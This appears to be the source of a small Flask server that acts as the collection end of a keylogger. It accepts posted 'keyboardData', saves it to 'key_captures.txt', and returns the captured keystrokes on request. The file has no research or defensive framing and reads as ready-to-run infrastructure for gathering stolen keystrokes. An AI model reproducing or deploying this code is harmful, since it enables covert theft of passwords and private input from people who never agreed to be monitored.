from flask import Flask, request, jsonify

app = Flask(__name__)
file_path = 'key_captures.txt'

@app.route('/', methods=['GET'])
def get_data():
    try:
        with open(file_path, 'r', encoding='utf8') as file:
            data = file.read()
        return jsonify({"data": data}), 200
    except FileNotFoundError:
        return jsonify({"error": "File not found, still capturing..."}), 404

@app.route('/', methods=['POST'])
def post_data():
    if request.is_json:
        data = request.json.get('keyboardData', '')
        if data:
            with open(file_path, 'w', encoding='utf8') as file:
                file.write(data)
            return jsonify({"message": "Successfully set the data"}), 200
        else:
            return jsonify({"error": "No 'keyboardData' in request"}), 400
    else:
        return jsonify({"error": "Request must be JSON"}), 400

if __name__ == '__main__':
    print(f"[+] Server is listening on port 8080...")
    app.run(port=8080)
